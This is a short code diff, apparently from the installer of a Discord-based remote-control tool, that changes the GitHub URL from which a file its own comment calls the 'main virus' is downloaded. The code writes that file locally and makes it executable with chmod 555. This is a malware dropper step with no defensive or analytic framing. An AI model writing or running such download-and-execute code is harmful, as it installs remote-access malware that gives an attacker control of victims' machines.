@@ -17,7 +17,7 @@ except FileNotFoundError:
     pass
 
 # download main virus
-open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/main", allow_redirects=True).content)
+open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main", allow_redirects=True).content)
 
 system(f"chmod 555 {localfile}")
 
